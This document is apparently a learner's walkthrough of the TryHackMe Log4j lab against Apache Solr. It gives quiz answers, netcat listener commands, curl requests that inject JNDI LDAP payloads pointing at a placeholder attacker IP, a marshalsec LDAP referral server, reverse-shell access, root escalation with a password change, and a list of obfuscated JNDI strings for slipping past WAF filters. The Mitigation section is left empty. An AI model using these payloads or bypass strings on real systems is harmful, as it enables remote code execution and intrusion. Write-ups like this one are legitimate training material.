# log4j SOLVING LAB OF TRY HACK ME

 # Reconnaissance
 1.What service is running on port 8983? (Just the name of the software)
 Answer:Aache solr
 
 *-p- scan all ports*
 
 *-sV -service version*
 <img width="1600" height="495" alt="image" src="https://github.com/user-attachments/assets/05b46937-2040-46e9-971b-abf5c96ed9cb" />
 # Dscover
 1.Take a close look at the first page visible when navigating to http://10.65.142.0:8983 (opens in new tab). You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?

<img width="627" height="317" alt="image" src="https://github.com/user-attachments/assets/90340c9c-27a8-48b2-a020-a47b82524ff4" />

Answer: /var/solr/logs

2. One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry?

   YOU CAN FIND MORE REQUESTS ARE IN GIVEN FILES (MENTION THE FILE NAME)

Answer: solr.log

3.  What "path" or URL endpoint is indicated in these repeated entries?
  
<img width="1140" height="112" alt="image" src="https://github.com/user-attachments/assets/51c6b290-96f0-45a7-a048-de7c098978ff" />

IN SAME FILE SOLR.LOG HAS THE PATH

Answer:/admin/cores

4) Viewing these log entries, what field name indicates some data entrypoint that you as a user could control?

FINDING SOLR.LOG WE SEE MANY REQUESTS BUT NOT PARAMETER ARE NOT PASSED SO USER CAN DONE BUT ITS EMPTY params{}.

Answer:params
# Proof Of Concept
FIRST know your ip.

using ip a

nc -lvnp 9999
<img width="1920" height="936" alt="Screenshot_2026-03-22_11_26_20" src="https://github.com/user-attachments/assets/a9419627-f7c1-4563-b24e-fdea63b096bc" />
OPEN ANOTHER TERMINAL 

curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'

<img width="1920" height="936" alt="Screenshot_2026-03-22_11_26_20" src="https://github.com/user-attachments/assets/fd656970-7b42-48f0-8bd9-8fdf6605b162" />
ITS GET REPONSE IN (nc -lvnp 9999)THE CONNECTION IS WORKING,THEN EXPLOIT
# Exploitation
**I HAVE DONE IN MY MACHINE NOT IN THE ATTACK BOX.**

THEY ALSO PROVIDE INSTRUCTION TO FOLLOW THE WITHOUT ATTACK BOX 

obtaining the LDAP Referral Server which already in git 

Initially *command : git clone  https://github.com/mbechler/marshalsec*

*Start LDAP server*
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://192.168.188.160:8000/#Exploit

<img width="1920" height="936" alt="image" src="https://github.com/user-attachments/assets/b7ed25bd-8ea9-4363-8962-77be57687087" />

Answer:listing on 0.0.0.0:1389

*start Exploit java*

CREATE THE JAVA FILE AND RUN  IT 

*IMP SAME FOLDER RUN PYTHON *

<img width="1920" height="936" alt="image" src="https://github.com/user-attachments/assets/ae7619e0-5f50-4939-9d7a-c474ef74c913" />
*Start netcat*
nc -lvnp 9999
**Execute the code**
           # curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
           
 <img width="1920" height="936" alt="Screenshot_2026-03-22_15_18_57" src="https://github.com/user-attachments/assets/e3f60caf-99ce-4e0b-b7cd-5debda46e89c" />
**finally**

we get access

<img width="964" height="178" alt="image" src="https://github.com/user-attachments/assets/7ab59db3-70fa-47f7-b5b8-44b2a80e38a0" />

# PERSISTENCE

To better understand this log4j vulnerability, 

>let's grant ourselves "better access" so we can explore the machine

>Analyze the affected logs

>And even mitigate the vulnerability!
1.WHOAMI

Answer:solr

NOTE:Here everthing is lokking same command and answer so

*python3 -c "import pty; pty.spawn('/bin/bash')"*

# sudo -l -Check super user permissions. For your convenience in this exercise, your user should have sudo privileges without the need for any password.

Now access into the machine via SSH, momentarily become root and change the password for the solr user to one of your choosing.

.sudo bash
.passwd eleven
.renter thr passwd eleven

exit from the netcat
**ssh solor@mahcineip**
# Detection
we alredy know the task 3 solr.log path var/solr/logs
cat ~/var/solar/logs~
We can checks that our code is executed
# Bypasses
**EVEN NOW FIREWALL MAKE STOPS THE JDIN LDAP OR SUCH THING**
BUT->Some tricking ways to bypasses or mention in the below such 
```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}
```
# Mitigation

